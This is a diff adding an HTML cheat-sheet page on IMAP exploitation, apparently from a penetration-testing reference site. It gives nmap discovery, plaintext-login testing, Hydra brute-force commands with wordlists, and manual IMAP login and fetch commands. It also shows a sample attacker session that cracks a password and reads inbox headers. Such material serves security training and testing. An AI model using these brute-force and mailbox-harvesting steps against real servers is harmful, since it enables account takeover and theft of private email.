@@ -1,0 +1,179 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">IMAP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Email Security</strong> • Focus: <strong>IMAP Abuse & Credential Attacks</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    IMAP (Internet Message Access Protocol) is used to access and manage emails 
+    stored on mail servers. Attackers target IMAP for brute-forcing credentials, 
+    exploiting plaintext authentication (when STARTTLS is not enforced), 
+    harvesting sensitive emails, and abusing credential reuse across services. 
+    Vulnerable IMAP servers have also been affected by buffer overflow bugs 
+    and authentication bypass issues. IMAP exploitation provides attackers with 
+    direct access to inboxes, useful for espionage, phishing, and lateral movement.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak Credentials:</strong> IMAP accounts often rely on reused or guessable passwords.</li>
+    <li><strong>Plaintext Authentication:</strong> Some servers allow LOGIN without encryption.</li>
+    <li><strong>Brute Force Exposure:</strong> TCP/143 (IMAP) and 993 (IMAPS) often exposed publicly.</li>
+    <li><strong>Email Harvesting:</strong> Attackers can exfiltrate mailboxes for sensitive data.</li>
+    <li><strong>Vulnerable Implementations:</strong> Past CVEs in Dovecot, Cyrus, Exchange IMAP services.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify IMAP services on TCP/143 and 993.</li>
+    <li><strong>Authentication Testing:</strong> Attempt plaintext login or STARTTLS downgrade.</li>
+    <li><strong>Brute Force:</strong> Crack credentials using wordlists.</li>
+    <li><strong>Mailbox Access:</strong> Read, download, or manipulate emails.</li>
+    <li><strong>Impact:</strong> Data theft, phishing campaigns, internal compromise.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint IMAP services.</li>
+    <li>Test for plaintext authentication support.</li>
+    <li>Brute-force login attempts with Hydra/Ncrack.</li>
+    <li>Access mailbox to harvest sensitive emails.</li>
+    <li>Leverage creds for lateral movement (VPN, OWA, SSH reuse).</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p143,993 -sV --script imap* [target]
+
+# ------------------------------
+# Plaintext Authentication Test
+# ------------------------------
+openssl s_client -connect [target]:143 -starttls imap
+a login user@example.com password123
+
+# ------------------------------
+# Brute Force Attack
+# ------------------------------
+hydra -l user@example.com -P rockyou.txt imap://[target]
+hydra -L users.txt -P passwords.txt -s 993 -S imap://[target]
+
+# ------------------------------
+# Manual Login
+# ------------------------------
+telnet [target] 143
+a login victim@example.com secret123
+a select inbox
+a fetch 1:* (body[header.fields (subject from date)])
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p143,993 -sV 192.168.1.50
+hydra -l victim@example.com -P rockyou.txt imap://192.168.1.50
+openssl s_client -connect 192.168.1.50:993
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p143,993 -sV 192.168.1.50
+PORT    STATE SERVICE VERSION
+143/tcp open  imap    Dovecot IMAPD
+993/tcp open  imaps   Dovecot SSL IMAPD
+
+[ saide ~ ]$ hydra -l victim@example.com -P rockyou.txt imap://192.168.1.50
+[143][imap] host: 192.168.1.50   login: victim@example.com   password: Summer2025!
+
+[ saide ~ ]$ openssl s_client -connect 192.168.1.50:993
+* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR STARTTLS] Dovecot ready.
+a login victim@example.com Summer2025!
+a OK Logged in.
+
+[ saide ~ ]$ telnet 192.168.1.50 143
+a login victim@example.com Summer2025!
+a select inbox
+* FLAGS (\Answered \Seen \Deleted \Draft)
+* 5 EXISTS
+a fetch 1:* (body[header.fields (subject from date)])
+Subject: Internal VPN Credentials
+From: admin@corp.local
+Date: Mon, 25 Aug 2025 10:32:11 +0000
+
+[*] Sensitive email data exfiltrated
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample IMAP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Banner Grab
+* OK [CAPABILITY IMAP4rev1 STARTTLS AUTH=PLAIN] IMAP4 server ready
+
+# Brute Force Result
+victim@example.com : Summer2025!
+
+# Mailbox Access
+Subject: Internal VPN Credentials
+From: admin@corp.local
+Date: Mon, 25 Aug 2025 10:32:11 +0000
+
+# Proof of Exploitation
+Inbox accessed → Sensitive emails exfiltrated
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting IMAP
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1114/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Email Collection
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Brute force → Inbox access → Data exfil → Lateral movement.</li>
+  </ul>
+</section>
